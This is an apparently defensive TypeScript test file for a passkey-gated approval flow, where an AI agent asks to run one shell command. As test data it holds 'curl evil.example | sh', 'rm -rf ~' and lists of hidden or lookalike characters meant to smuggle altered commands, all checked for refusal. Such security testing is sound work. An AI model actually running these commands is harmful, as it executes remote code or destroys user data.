import { runInDurableObject } from "cloudflare:test";
import type { Client } from "@modelcontextprotocol/client";
import {
  type Comment,
  type CommentList,
  type PasskeyChallenge,
  R,
  type CommentThread as Thread,
} from "@oa/shared";
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";
import { createApp } from "../src/app.js";
import { createPat } from "../src/auth/pat.js";
import { runtimeStub } from "../src/runtime/do.js";
import { publish } from "../src/services/artifacts.js";
import { addThread, consumePermission } from "../src/services/comments.js";
import { permissionReqHash } from "../src/services/permission.js";
import { getUser } from "../src/services/users.js";
import { api, errOf } from "./helpers.js";
import { close, connect, textOf, tool } from "./mcp-helpers.js";
import {
  addPasskey,
  assertFor,
  E,
  mkUser,
  type U,
} from "./passkey-fixtures.js";
import type { FakeAuthenticator } from "./passkey-helper.js";

// #1958 (a): an agent asks, from a private page, to run one command; the
// person approves with their passkey; the agent uses the approval once. Every
// red-line case below leaves consume refused.

const app = createApp();
const REQ = {
  toolName: "Bash",
  command: "npx @open-artifacts/bus@latest install",
  cwd: "/Users/me/code/proj",
  sessionId: "sess-1",
  machineId: "mach-1",
};
type Req = typeof REQ;
type K = { artifactId: string; threadId: string; commentId: string };
type Agent = { id: string; token: string; client: Client };

let alice: U; // the person; has a usable passkey
let aliceKey: FakeAuthenticator;
let bob: U; // another member, with a passkey of their own
const clients: Client[] = [];
let agent: Agent;

const member = async (u: U) => {
  const m = await getUser(E, u.userId);
  if (!m) throw new Error("no user");
  return m;
};

async function mkAgent(u: U): Promise<Agent> {
  const p = await createPat(E, u.userId, "agent");
  const client = await connect(p.token);
  clients.push(client);
  return { ...p, client };
}

beforeAll(async () => {
  alice = await mkUser("pm-alice");
  bob = await mkUser("pm-bob");
  aliceKey = (await addPasskey(app, alice)).a;
  await addPasskey(app, bob);
});
afterAll(async () => {
  await Promise.all(clients.map((c) => close(c)));
});
beforeEach(async () => {
  // A fresh agent each test: the caps are per agent.
  agent = await mkAgent(alice);
  await E.DB.prepare("delete from counters where key like 'pk:ch:%'").run();
});

/** A private page of alice's own. */
async function page(owner: U = alice): Promise<string> {
  return (
    await publish(
      E,
      await member(owner),
      { title: "status", format: "html", content: "<p>x</p>" } as never,
      null,
      undefined,
      "create",
    )
  ).id;
}

const askOf = (over: object = {}, to = alice.userId, req: object = REQ) => ({
  kind: "permission",
  request: req,
  to: [{ key: to }],
  ...over,
});

const postRaw = (a: Agent, id: string, ask: object) =>
  tool(a.client, "add_comment", { id, body: "May I run a command?", ask });

/** Posts a permission ask and returns where it lives; fails the test if refused. */
async function post(
  a: Agent = agent,
  req: object = REQ,
  id?: string,
): Promise<K & { comment: Comment }> {
  const artifactId = id ?? (await page());
  const r = await postRaw(a, artifactId, askOf({}, alice.userId, req));
  expect(r.isError, textOf(r)).toBeFalsy();
  const t = (r.structuredContent as { thread: Thread }).thread;
  const c = t.comments[0] as Comment;
  return { artifactId, threadId: t.id, commentId: c.id, comment: c };
}

const challenge = (k: K, auth: string, optionId = "run") =>
  api(
    app,
    R.commentAnswerChallenge(k.artifactId, k.threadId, k.commentId),
    auth,
    { method: "POST", body: { optionId } },
  );
const answer = (k: K, auth: string, body: object) =>
  api(app, R.commentAnswer(k.artifactId, k.threadId, k.commentId), auth, {
    method: "POST",
    body,
  });
/** A real approval: challenge, passkey tap, answer. */
async function pick(
  k: K,
  u: U = alice,
  key: FakeAuthenticator = aliceKey,
  optionId = "run",
) {
  const c = await challenge(k, u.cookie, optionId);
  expect(c.status, await c.clone().text()).toBe(200);
  const assertion = await assertFor(key, (await c.json()) as PasskeyChallenge);
  return answer(k, u.cookie, { optionId, assertion });
}
const consume = (k: K, auth: string, body: object = REQ) =>
  api(app, R.commentConsume(k.artifactId, k.threadId, k.commentId), auth, {
    method: "POST",
    body,
  });
const withdraw = (k: K, auth: string) =>
  api(app, R.commentWithdraw(k.artifactId, k.threadId, k.commentId), auth, {
    method: "POST",
    body: {},
  });
const refusedWith = async (r: Response, reason: string) => {
  expect(r.status).toBe(409);
  const e = await errOf(r);
  expect(e.code).toBe("consume_refused");
  expect(e.details).toEqual({ reason });
};
const read = async (k: K, auth: string) => {
  const l = (await (
    await api(app, R.comments(k.artifactId), auth)
  ).json()) as CommentList;
  return l.threads
    .flatMap((t) => t.comments)
    .find((c) => c.id === k.commentId) as Comment;
};
const inDo = <T>(id: string, cb: (sql: SqlStorage) => T) =>
  runInDurableObject(
    runtimeStub(E, id) as unknown as DurableObjectStub,
    (_i, state) => cb(state.storage.sql),
  );
/** Rewrites the stored permission state of an ask (a test clock and tamper hook). */
const patchPerm = (k: K, patch: object) =>
  inDo(k.artifactId, (sql) => {
    const row = sql
      .exec<{ permission: string }>(
        "select permission from comment_asks where comment_id = ?",
        k.commentId,
      )
      .one();
    sql.exec(
      "update comment_asks set permission = ? where comment_id = ?",
      JSON.stringify({ ...JSON.parse(row.permission), ...patch }),
      k.commentId,
    );
  });

describe("posting a permission ask", () => {
  it("stores the request, fixed options, the passkey mark, a server hash and 10 minutes", async () => {
    const before = Date.now();
    const k = await post();
    const ask = k.comment.ask;
    expect(ask?.kind).toBe("permission");
    expect(ask?.confirm).toBe("passkey");
    expect(ask?.options).toEqual([
      { id: "run", label: "Run once" },
      { id: "deny", label: "Don't run" },
    ]);
    expect(ask?.request).toEqual(REQ);
    const exp = Date.parse(ask?.expiresAt ?? "");
    expect(exp).toBeGreaterThanOrEqual(before + 10 * 60_000);
    expect(exp).toBeLessThanOrEqual(Date.now() + 10 * 60_000);
    const stored = await inDo(k.artifactId, (sql) =>
      sql
        .exec<{ permission: string }>(
          "select permission from comment_asks where comment_id = ?",
          k.commentId,
        )
        .one(),
    );
    expect(JSON.parse(stored.permission).reqHash).toBe(
      await permissionReqHash(REQ),
    );
    // The one fixed encoding.
    const data = new TextEncoder().encode(
      JSON.stringify([
        "oa-perm-v1",
        REQ.toolName,
        REQ.command,
        REQ.cwd,
        REQ.sessionId,
        REQ.machineId,
      ]),
    );
    const hex = [...new Uint8Array(await crypto.subtle.digest("SHA-256", data))]
      .map((b) => b.toString(16).padStart(2, "0"))
      .join("");
    expect(await permissionReqHash(REQ)).toBe(hex);
  });

  it("refuses a client-sent reqHash, unknown keys, client options, confirm and recommended (400)", async () => {
    const id = await page();
    const bad = async (ask: object) => {
      const r = await postRaw(agent, id, ask);
      expect(r.isError).toBe(true);
      expect(textOf(r)).toMatch(/bad_request|Invalid arguments/);
    };
    await bad(askOf({ request: { ...REQ, reqHash: "a".repeat(64) } }));
    await bad(askOf({ reqHash: "a".repeat(64) }));
    await bad(askOf({ request: { ...REQ, extra: "x" } }));
    await bad(
      askOf({
        options: [
          { id: "run", label: "Run once" },
          { id: "always", label: "Always" },
        ],
      }),
    );
    await bad(askOf({ confirm: "passkey" }));
    await bad(askOf({ recommended: { optionId: "run", why: "x" } }));
    await bad(askOf({ request: { ...REQ, command: "x".repeat(8193) } }));
    await bad(askOf({ request: { ...REQ, cwd: "relative/path" } }));
    await bad(askOf({ request: { ...REQ, sessionId: "s".repeat(201) } }));
    await bad(askOf({ request: { ...REQ, toolName: "" } }));
    // None of it left a card behind.
    const l = (await (
      await api(app, R.comments(id), alice.cookie)
    ).json()) as CommentList;
    expect(l.threads).toHaveLength(0);
  });

  it("a kind: permission ask can never become a plain ask", async () => {
    const id = await page();
    const r = await postRaw(agent, id, {
      kind: "permission",
      question: "q",
      request: REQ,
      options: [
        { id: "a", label: "A" },
        { id: "b", label: "B" },
      ],
      to: [{ key: alice.userId }],
    });
    expect(r.isError).toBe(true);
  });

  it("refuses control, bidi, zero-width and variation characters in any field (400 unsafe_characters)", async () => {
    const id = await page();
    const chars = [
      "\u202E",
      "\u2066",
      "\u200B",
      "\u200D",
      "\u0000",
      "\u0007",
      "\r",
      "\u001B",
      "\u0085",
      "\u2028",
      "\u2029",
      "\uFEFF",
      "\uFE0F",
      "\u{E0100}",
    ];
    for (const ch of chars) {
      for (const [field, req] of [
        ["command", { ...REQ, command: `ls ${ch} -la` }],
        ["cwd", { ...REQ, cwd: `/tmp/a${ch}b` }],
        ["toolName", { ...REQ, toolName: `Bash${ch}` }],
        ["sessionId", { ...REQ, sessionId: `s${ch}` }],
        ["machineId", { ...REQ, machineId: `m${ch}` }],
      ] as const) {
        const r = await postRaw(agent, id, askOf({}, alice.userId, req));
        expect(r.isError, `${field} ${ch.codePointAt(0)}`).toBe(true);
        expect(textOf(r), `${field} ${ch.codePointAt(0)}`).toMatch(
          /^unsafe_characters/,
        );
      }
    }
    // Newline and tab are fine in a command, never in a path.
    const ok = await postRaw(
      agent,
      id,
      askOf({}, alice.userId, { ...REQ, command: "ls\n\tpwd" }),
    );
    expect(ok.isError, textOf(ok)).toBeFalsy();
    const nl = await postRaw(
      agent,
      id,
      askOf({}, alice.userId, { ...REQ, cwd: "/tmp/a\nb" }),
    );
    expect(textOf(nl)).toMatch(/^unsafe_characters/);
  });

  it("only to the agent's own user (403)", async () => {
    const id = await page();
    const r = await postRaw(agent, id, askOf({}, bob.userId));
    expect(r.isError).toBe(true);
    expect(textOf(r)).toMatch(/^forbidden/);
    const two = await postRaw(agent, id, {
      ...askOf(),
      to: [{ key: alice.userId }, { key: bob.userId }],
    });
    expect(two.isError).toBe(true);
  });

  it("only an agent posts it: a person typing in the web app is refused (403)", async () => {
    const id = await page();
    const post403 = (who: object) =>
      expect(
        addThread(
          E,
          { id, format: "html", currentVersion: 1 } as never,
          who as never,
          { userId: alice.userId, short: null, moderator: true },
          {
            anchor: { kind: "note" } as never,
            body: "x",
            ask: askOf() as never,
          },
          { moderator: true },
        ),
      ).rejects.toMatchObject({ code: "forbidden" });
    await post403({ kind: "user", id: alice.userId, agent: null, typed: true });
    await post403({ kind: "user", id: alice.userId, agent: null });
  });

  it("only on a page nobody else can read (403)", async () => {
    const refused = async (id: string, why = "") => {
      const r = await postRaw(agent, id, askOf());
      expect(r.isError, why).toBe(true);
      expect(textOf(r), why).toMatch(/^forbidden/);
    };
    const shared = await page();
    await api(app, R.shares(shared), alice.cookie, {
      method: "PUT",
      body: { email: (await member(bob)).email, role: "viewer" },
    });
    await refused(shared, "shared");
    for (const v of ["team", "public"]) {
      const id = await page();
      await E.DB.prepare("update artifacts set visibility = ? where id = ?")
        .bind(v, id)
        .run();
      await refused(id, v);
    }
    // In a space others belong to.
    const inSpace = await page();
    await E.DB.prepare(
      "insert into spaces (id, kind, name, created_at) values (?, 'shared', 'team', ?)",
    )
      .bind(`sp-${inSpace}`, Date.now())
      .run();
    for (const [u, role] of [
      [alice, "manager"],
      [bob, "viewer"],
    ] as const)
      await E.DB.prepare(
        "insert into space_members (space_id, user_id, role, source, created_at) values (?, ?, ?, 'manual', ?)",
      )
        .bind(`sp-${inSpace}`, u.userId, role, Date.now())
        .run();
    await E.DB.prepare("update artifacts set space_id = ? where id = ?")
      .bind(`sp-${inSpace}`, inSpace)
      .run();
    await refused(inSpace, "space");
    // Someone else's page, shared to alice.
    const theirs = await page(bob);
    await api(app, R.shares(theirs), bob.cookie, {
      method: "PUT",
      body: { email: (await member(alice)).email, role: "editor" },
    });
    await refused(theirs, "theirs");
  });

  it("at most 3 pending per agent (429), and a withdrawn one frees its slot", async () => {
    const a = await mkAgent(alice);
    const ks = [await post(a), await post(a), await post(a)];
    const r = await postRaw(a, await page(), askOf());
    expect(r.isError).toBe(true);
    expect(textOf(r)).toMatch(/^rate_limited/);
    // Another agent is not held back.
    await post(await mkAgent(alice));
    expect((await withdraw(ks[0] as K, a.token)).status).toBe(200);
    await post(a);
  });

  it("an answered but unused ask still counts; a used one does not", async () => {
    const a = await mkAgent(alice);
    const k1 = await post(a);
    await post(a);
    await post(a);
    expect((await pick(k1)).status).toBe(200);
    expect((await postRaw(a, await page(), askOf())).isError).toBe(true);
    expect((await consume(k1, a.token)).status).toBe(200);
    await post(a);
  });

  it("at most 20 created an hour per agent (429)", async () => {
    const a = await mkAgent(alice);
    for (let i = 0; i < 20; i++)
      await E.DB.prepare(
        "insert into permission_asks (id, user_id, agent_key, artifact_id, created_at, expires_at, done_at) values (?, ?, ?, 'x', ?, ?, ?)",
      )
        .bind(
          `old-${a.id}-${i}`,
          alice.userId,
          `${alice.userId}|t:${a.id}`,
          Date.now() - 1000,
          Date.now() - 500,
          Date.now() - 400,
        )
        .run();
    const r = await postRaw(a, await page(), askOf());
    expect(r.isError).toBe(true);
    expect(textOf(r)).toMatch(/^rate_limited/);
  });
});

describe("who sees the request", () => {
  it("the addressee and their agent in full; another reader without the request and the question", async () => {
    const k = await post();
    await api(app, R.shares(k.artifactId), alice.cookie, {
      method: "PUT",
      body: { email: (await member(bob)).email, role: "viewer" },
    });
    const mine = await read(k, alice.cookie);
    expect(mine.ask?.request).toEqual(REQ);
    expect(mine.ask?.question).toBe("Run this command once?");
    const theirs = await read(k, bob.cookie);
    expect(theirs.ask?.question).toBe("a permission request");
    expect(theirs.ask?.request).toBeUndefined();
    expect(JSON.stringify(theirs)).not.toContain(REQ.command);
    expect(JSON.stringify(theirs)).not.toContain(REQ.cwd);
    // MCP reads: the agent in full, another member's agent redacted.
    const list = async (c: Client) => {
      const r = await tool(c, "list_comments", { id: k.artifactId });
      expect(r.isError, textOf(r)).toBeFalsy();
      return r.structuredContent as CommentList;
    };
    const find = (l: CommentList) =>
      l.threads.flatMap((t) => t.comments).find((c) => c.id === k.commentId);
    expect(find(await list(agent.client))?.ask?.request).toEqual(REQ);
    const bobAgent = await mkAgent(bob);
    const seen = find(await list(bobAgent.client));
    expect(seen?.ask?.question).toBe("a permission request");
    expect(seen?.ask?.request).toBeUndefined();
    expect(JSON.stringify(seen)).not.toContain(REQ.command);
    // A signed-out reader of a (now) public page sees nothing of it either.
    await E.DB.prepare(
      "update artifacts set visibility = 'public' where id = ?",
    )
      .bind(k.artifactId)
      .run();
    const anon = await api(app, R.comments(k.artifactId), null);
    expect(anon.status).toBe(200);
    expect(await anon.text()).not.toContain(REQ.command);
  });
});

describe("only plain text is allowed", () => {
  const odd = [
    ["Hangul filler", "\u3164"],
    ["braille blank", "\u2800"],
    ["combining grapheme joiner", "\u034F"],
    ["no-break space", "\u00A0"],
    ["em space", "\u2003"],
    ["ideographic space", "\u3000"],
    ["combining mark", "e\u0301"],
    ["Khmer inherent vowel", "\u17B4"],
    ["halfwidth Hangul filler", "\uFFA0"],
  ] as const;

  it("refuses them in every field on post (400 unsafe_characters), and in the question", async () => {
    const id = await page();
    for (const [name, ch] of odd) {
      for (const req of [
        { ...REQ, command: `ls ${ch}` },
        { ...REQ, cwd: `/tmp/${ch}` },
        { ...REQ, toolName: `Bash${ch}` },
        { ...REQ, sessionId: `s${ch}` },
        { ...REQ, machineId: `m${ch}` },
      ]) {
        const r = await postRaw(agent, id, askOf({}, alice.userId, req));
        expect(r.isError, name).toBe(true);
        expect(textOf(r), name).toMatch(/^unsafe_characters/);
      }
      const q = await postRaw(agent, id, askOf({ question: `why${ch}x` }));
      expect(textOf(q), name).toMatch(/^unsafe_characters/);
    }
    // Ordinary text, symbols and emoji still pass.
    const ok = await postRaw(
      agent,
      id,
      askOf({}, alice.userId, { ...REQ, command: "echo 'héllo' | wc -l # ✓" }),
    );
    expect(ok.isError, textOf(ok)).toBeFalsy();
  });

  it("refuses them on consume (400)", async () => {
    const k = await post();
    await pick(k);
    for (const [name, ch] of odd) {
      const r = await consume(k, agent.token, {
        ...REQ,
        command: `${REQ.command}${ch}`,
      });
      expect(r.status, name).toBe(400);
      expect((await errOf(r)).code, name).toBe("unsafe_characters");
      const c = await consume(k, agent.token, { ...REQ, cwd: `/x${ch}` });
      expect(c.status, name).toBe(400);
    }
    expect((await consume(k, agent.token)).status).toBe(200);
  });
});

describe("lookalike warning", () => {
  it("nonAscii is on the addressee's view only when a field holds a character above U+007E", async () => {
    const plain = await post();
    expect((await read(plain, alice.cookie)).ask?.nonAscii).toBeUndefined();
    // Cyrillic "\u0441" looks like a Latin "c".
    const odd = await post(agent, { ...REQ, command: "\u0441url example.com" });
    expect(odd.comment.ask?.nonAscii).toBe(true);
    expect((await read(odd, alice.cookie)).ask?.nonAscii).toBe(true);
    const cwd = await post(agent, { ...REQ, cwd: "/Users/m\u00e9/proj" });
    expect(cwd.comment.ask?.nonAscii).toBe(true);
    // Newline and tab stay allowed and are plain ASCII.
    const nl = await post(await mkAgent(alice), {
      ...REQ,
      command: "ls\n\tpwd",
    });
    expect(nl.comment.ask?.nonAscii).toBeUndefined();
    // Not shown to anyone else.
    await api(app, R.shares(odd.artifactId), alice.cookie, {
      method: "PUT",
      body: { email: (await member(bob)).email, role: "viewer" },
    });
    expect((await read(odd, bob.cookie)).ask?.nonAscii).toBeUndefined();
  });
});

describe("the same agent, exactly", () => {
  const grant = {
    name: "agent",
    version: null,
    via: { kind: "grant", id: "g-1" },
  };
  const ident = {
    identityId: "idn-1",
    namespace: "ns",
    name: "builder",
    kind: "claude",
  };
  const whoOf = (agentAttr: object) =>
    ({ kind: "user", id: alice.userId, agent: agentAttr }) as never;

  async function postAs(agentAttr: object): Promise<K> {
    const artifactId = await page();
    const t = (await addThread(
      E,
      { id: artifactId, format: "html", currentVersion: 1 } as never,
      whoOf(agentAttr),
      { userId: alice.userId, short: null, moderator: true },
      { anchor: { kind: "note" } as never, body: "x", ask: askOf() as never },
      { moderator: true },
    )) as Thread;
    const k = {
      artifactId,
      threadId: t.id,
      commentId: (t.comments[0] as Comment).id,
    };
    expect((await pick(k)).status).toBe(200);
    return k;
  }
  const consumeAs = (k: K, agentAttr: object) =>
    consumePermission(
      E,
      k.artifactId,
      k.threadId,
      k.commentId,
      whoOf(agentAttr),
      REQ,
    );

  it("posted by a grant alone: the same grant with a bus identity is refused", async () => {
    const k = await postAs({ ...grant, via: { kind: "grant", id: "g-a" } });
    await expect(
      consumeAs(k, {
        ...grant,
        via: { kind: "grant", id: "g-a" },
        identity: ident,
      }),
    ).rejects.toMatchObject({ code: "forbidden" });
    await expect(
      consumeAs(k, { ...grant, via: { kind: "grant", id: "g-b" } }),
    ).rejects.toMatchObject({ code: "forbidden" });
    await expect(
      consumeAs(k, { ...grant, via: { kind: "grant", id: "g-a" } }),
    ).resolves.toEqual({ consumed: true });
  });

  it("posted with a bus identity: the same grant without it is refused", async () => {
    const k = await postAs({
      ...grant,
      via: { kind: "grant", id: "g-c" },
      identity: ident,
    });
    await expect(
      consumeAs(k, { ...grant, via: { kind: "grant", id: "g-c" } }),
    ).rejects.toMatchObject({ code: "forbidden" });
    await expect(
      consumeAs(k, {
        ...grant,
        via: { kind: "grant", id: "g-c" },
        identity: { ...ident, identityId: "idn-2" },
      }),
    ).rejects.toMatchObject({ code: "forbidden" });
    await expect(
      consumeAs(k, {
        ...grant,
        via: { kind: "grant", id: "g-c" },
        identity: ident,
      }),
    ).resolves.toEqual({ consumed: true });
  });
});

describe("a page shared after posting", () => {
  const share = (k: K) =>
    api(app, R.shares(k.artifactId), alice.cookie, {
      method: "PUT",
      body: { email: "pm-late@x.com", role: "viewer" },
    });

  it("approved, then shared: consume is refused (page_shared)", async () => {
    const k = await post();
    expect((await pick(k)).status).toBe(200);
    expect((await share(k)).status).toBe(200);
    await refusedWith(await consume(k, agent.token), "page_shared");
  });

  it("shared before the pick: no challenge and no answer (409)", async () => {
    const k = await post();
    expect((await share(k)).status).toBe(200);
    const c = await challenge(k, alice.cookie);
    expect(c.status).toBe(409);
    const r = await answer(k, alice.cookie, { optionId: "deny" });
    expect(r.status).toBe(409);
  });
});

describe("the durable audit and the reserved slot", () => {
  const slot = (a: Agent) =>
    E.DB.prepare(
      "select consumed_at c, withdrawn_at w, done_at d from permission_asks where agent_key = ?",
    )
      .bind(`${alice.userId}|t:${a.id}`)
      .all<{ c: number | null; w: number | null; d: number | null }>();

  it("records consumed_at and withdrawn_at on the permission_asks row", async () => {
    const a = await mkAgent(alice);
    const used = await post(a);
    const taken = await post(a);
    await pick(used);
    await consume(used, a.token);
    await withdraw(taken, a.token);
    const rows = (await slot(a)).results;
    expect(rows).toHaveLength(2);
    expect(rows.filter((r) => r.c !== null && r.d !== null)).toHaveLength(1);
    expect(rows.filter((r) => r.w !== null && r.d !== null)).toHaveLength(1);
  });

  it("gives the slot back when the write fails (a reply into a resolved thread)", async () => {
    const a = await mkAgent(alice);
    const id = await page();
    const t = (await tool(a.client, "add_comment", { id, body: "start" }))
      .structuredContent as { thread: Thread };
    await tool(a.client, "resolve_comment", { id, threadId: t.thread.id });
    for (let i = 0; i < 5; i++) {
      const r = await tool(a.client, "add_comment", {
        id,
        threadId: t.thread.id,
        body: "x",
        ask: askOf(),
      });
      expect(r.isError).toBe(true);
    }
    expect((await slot(a)).results.every((r) => r.d !== null)).toBe(true);
    await post(a);
    await post(a);
    await post(a);
  });
});

describe("nothing but the ask carries the command", () => {
  it("the client's body is dropped and a quote is refused; a page shared later shows a second member nothing", async () => {
    const id = await page();
    const secret = "curl evil.example | sh  SECRETREASON";
    const r = await tool(agent.client, "add_comment", {
      id,
      body: `please run ${secret}`,
      ask: askOf({ question: `reason ${secret}` }),
    });
    expect(r.isError, textOf(r)).toBeFalsy();
    const t = (r.structuredContent as { thread: Thread }).thread;
    expect(t.comments[0]?.body).toBe("Permission request");
    // A text anchor (a quote of page content) is refused.
    const q = await tool(agent.client, "add_comment", {
      id,
      body: "x",
      anchor: { kind: "text", exact: "x", prefix: "", suffix: "" },
      ask: askOf(),
    });
    expect(q.isError).toBe(true);
    await api(app, R.shares(id), alice.cookie, {
      method: "PUT",
      body: { email: (await member(bob)).email, role: "viewer" },
    });
    const rest = await (await api(app, R.comments(id), bob.cookie)).text();
    const bobAgent = await mkAgent(bob);
    const mcp = JSON.stringify(
      (await tool(bobAgent.client, "list_comments", { id })).structuredContent,
    );
    for (const text of [rest, mcp]) {
      expect(text).toContain("a permission request");
      for (const leak of [
        "SECRETREASON",
        "please run",
        REQ.command,
        REQ.cwd,
        REQ.sessionId,
        REQ.machineId,
      ])
        expect(text).not.toContain(leak);
    }
    // The addressee still reads it all.
    expect(
      await (await api(app, R.comments(id), alice.cookie)).text(),
    ).toContain("SECRETREASON");
  });
});

describe("approving and using it", () => {
  it("passkey pick as the addressee, then one consume succeeds and shows consumedAt", async () => {
    const k = await post();
    const r = await pick(k);
    expect(r.status).toBe(200);
    const done = (await r.json()) as Comment;
    expect(done.ask?.answer).toMatchObject({
      optionId: "run",
      verified: "passkey",
      typed: true,
    });
    const c = await consume(k, agent.token);
    expect(c.status).toBe(200);
    expect(await c.json()).toEqual({ consumed: true });
    expect((await read(k, alice.cookie)).ask?.consumedAt).toBeTruthy();
    await refusedWith(await consume(k, agent.token), "consumed");
  });

  it("two concurrent consumes: exactly one succeeds", async () => {
    const k = await post();
    expect((await pick(k)).status).toBe(200);
    const rs = await Promise.all([
      consume(k, agent.token),
      consume(k, agent.token),
    ]);
    expect(rs.map((r) => r.status).sort()).toEqual([200, 409]);
    const lost = rs.find((r) => r.status === 409) as Response;
    expect((await errOf(lost)).details).toEqual({ reason: "consumed" });
  });

  it("the challenge records the request hash, and binds the pick to it", async () => {
    const k = await post();
    const c = await challenge(k, alice.cookie);
    expect(c.status).toBe(200);
    const row = await E.DB.prepare(
      "select req_hash h, binding b from pick_assertions where scope = ?",
    )
      .bind(`pick:${k.artifactId}:${k.commentId}`)
      .first<{ h: string; b: string }>();
    expect(row?.h).toBe(await permissionReqHash(REQ));
    expect(row?.b).toBe(`run|${await permissionReqHash(REQ)}`);
    // The hash the ask holds changes under the challenge: the assertion fails.
    await patchPerm(k, { reqHash: "f".repeat(64) });
    const assertion = await assertFor(
      aliceKey,
      (await c.json()) as PasskeyChallenge,
    );
    const r = await answer(k, alice.cookie, { optionId: "run", assertion });
    expect(r.status).toBe(400);
    expect((await errOf(r)).code).toBe("passkey_failed");
    await refusedWith(await consume(k, agent.token), "not_approved");
  });
});

describe("red lines: consume stays refused", () => {
  it("a token pick", async () => {
    const k = await post();
    const r = await answer(k, alice.pat, { optionId: "run" });
    expect(r.status).toBe(403);
    expect((await errOf(r)).code).toBe("passkey_required");
    expect((await challenge(k, alice.pat)).status).toBe(403);
    await refusedWith(await consume(k, agent.token), "not_approved");
  });

  it("an MCP caller cannot answer for the person either", async () => {
    const k = await post();
    const r = await answer(k, agent.token, { optionId: "run" });
    expect(r.status).toBe(403);
    await refusedWith(await consume(k, agent.token), "not_approved");
  });

  it("a pick without an assertion", async () => {
    const k = await post();
    const r = await answer(k, alice.cookie, { optionId: "run" });
    expect(r.status).toBe(403);
    expect((await errOf(r)).code).toBe("passkey_required");
    await refusedWith(await consume(k, agent.token), "not_approved");
  });

  it("a replayed assertion", async () => {
    const first = await post();
    const c = await challenge(first, alice.cookie);
    const assertion = await assertFor(
      aliceKey,
      (await c.json()) as PasskeyChallenge,
    );
    expect(
      (await answer(first, alice.cookie, { optionId: "run", assertion }))
        .status,
    ).toBe(200);
    const second = await post();
    const r = await answer(second, alice.cookie, {
      optionId: "run",
      assertion,
    });
    expect(r.status).toBeGreaterThanOrEqual(400);
    await refusedWith(await consume(second, agent.token), "not_approved");
    // The same assertion for the same ask, twice.
    const again = await answer(first, alice.cookie, {
      optionId: "run",
      assertion,
    });
    expect(again.status).toBeGreaterThanOrEqual(400);
  });

  it("a command changed after approval (mismatch)", async () => {
    const k = await post();
    expect((await pick(k)).status).toBe(200);
    await refusedWith(
      await consume(k, agent.token, { ...REQ, command: "rm -rf ~" }),
      "mismatch",
    );
    for (const f of ["cwd", "sessionId", "machineId", "toolName"] as const)
      await refusedWith(
        await consume(k, agent.token, {
          ...REQ,
          [f]: f === "cwd" ? "/etc" : "other",
        }),
        "mismatch",
      );
    // The real one still works, once.
    expect((await consume(k, agent.token)).status).toBe(200);
  });

  it("an expired ask: no answer, no challenge, no consume", async () => {
    const approved = await post();
    expect((await pick(approved)).status).toBe(200);
    await patchPerm(approved, { expiresAtMs: Date.now() - 1 });
    await refusedWith(await consume(approved, agent.token), "expired");

    const pending = await post();
    await patchPerm(pending, { expiresAtMs: Date.now() - 1 });
    const c = await challenge(pending, alice.cookie);
    expect(c.status).toBe(409);
    expect((await errOf(c)).code).toBe("expired");
    // Even with an assertion from before it expired, the DO refuses the answer.
    const k2 = await post();
    const ch = await challenge(k2, alice.cookie);
    const assertion = await assertFor(
      aliceKey,
      (await ch.json()) as PasskeyChallenge,
    );
    await patchPerm(k2, { expiresAtMs: Date.now() - 1 });
    const r = await answer(k2, alice.cookie, { optionId: "run", assertion });
    expect(r.status).toBe(409);
    expect((await errOf(r)).code).toBe("expired");
    await refusedWith(await consume(k2, agent.token), "expired");
  });

  it("another member's pick", async () => {
    const k = await post();
    // Bob cannot even see the page.
    expect((await challenge(k, bob.cookie)).status).toBeGreaterThanOrEqual(403);
    expect(
      (await answer(k, bob.cookie, { optionId: "run" })).status,
    ).toBeGreaterThanOrEqual(403);
    await refusedWith(await consume(k, agent.token), "not_approved");
    // Shared in later, he is still not the person asked.
    await api(app, R.shares(k.artifactId), alice.cookie, {
      method: "PUT",
      body: { email: (await member(bob)).email, role: "editor" },
    });
    const c = await challenge(k, bob.cookie);
    expect(c.status).toBe(403);
    const r = await answer(k, bob.cookie, { optionId: "run" });
    expect(r.status).toBe(403);
    // Shared now, so the page itself is the ground for refusing.
    await refusedWith(await consume(k, agent.token), "page_shared");
  });

  it("a second consume", async () => {
    const k = await post();
    await pick(k);
    expect((await consume(k, agent.token)).status).toBe(200);
    await refusedWith(await consume(k, agent.token), "consumed");
  });

  it("a client-sent reqHash on consume (400)", async () => {
    const k = await post();
    await pick(k);
    const r = await consume(k, agent.token, {
      ...REQ,
      reqHash: await permissionReqHash(REQ),
    });
    expect(r.status).toBe(400);
    expect((await consume(k, agent.token)).status).toBe(200);
  });

  it("bidi, zero-width or control characters on consume (400)", async () => {
    const k = await post();
    await pick(k);
    for (const command of [`${REQ.command}\u202E`, `${REQ.command}\u200B`]) {
      const r = await consume(k, agent.token, { ...REQ, command });
      expect(r.status).toBe(400);
      expect((await errOf(r)).code).toBe("unsafe_characters");
    }
    expect(
      (await consume(k, agent.token, { ...REQ, cwd: "/a\u0000" })).status,
    ).toBe(400);
  });

  it("deny never lets consume through; a changed mind to run needs a new passkey tap", async () => {
    const k = await post();
    expect((await pick(k, alice, aliceKey, "deny")).status).toBe(200);
    await refusedWith(await consume(k, agent.token), "not_approved");
    expect((await pick(k)).status).toBe(200);
    expect((await consume(k, agent.token)).status).toBe(200);
  });

  it("another agent consuming (403), even the person's own other agent or a browser session", async () => {
    const k = await post();
    await pick(k);
    const other = await mkAgent(alice);
    expect((await consume(k, other.token)).status).toBe(403);
    expect((await consume(k, alice.cookie)).status).toBe(403);
    expect((await consume(k, bob.pat)).status).toBeGreaterThanOrEqual(403);
    // The bare personal token of the person is a different credential from the agent's.
    expect((await consume(k, alice.pat)).status).toBe(403);
    expect((await consume(k, agent.token)).status).toBe(200);
  });

  it("an unapproved ask", async () => {
    const k = await post();
    await refusedWith(await consume(k, agent.token), "not_approved");
  });
});

describe("withdraw", () => {
  it("the posting agent withdraws; no answer, no consume afterwards", async () => {
    const k = await post();
    const w = await withdraw(k, agent.token);
    expect(w.status).toBe(200);
    expect(await w.json()).toEqual({ withdrawn: true });
    expect((await withdraw(k, agent.token)).status).toBe(200);
    expect((await read(k, alice.cookie)).ask?.withdrawn).toBe(true);
    const c = await challenge(k, alice.cookie);
    expect(c.status).toBe(409);
    expect((await errOf(c)).code).toBe("withdrawn");
    await refusedWith(await consume(k, agent.token), "withdrawn");
  });

  it("an approved ask withdrawn can not be used", async () => {
    const k = await post();
    await pick(k);
    expect((await withdraw(k, agent.token)).status).toBe(200);
    await refusedWith(await consume(k, agent.token), "withdrawn");
  });

  it("only the posting agent withdraws (403), and not after consume (409)", async () => {
    const k = await post();
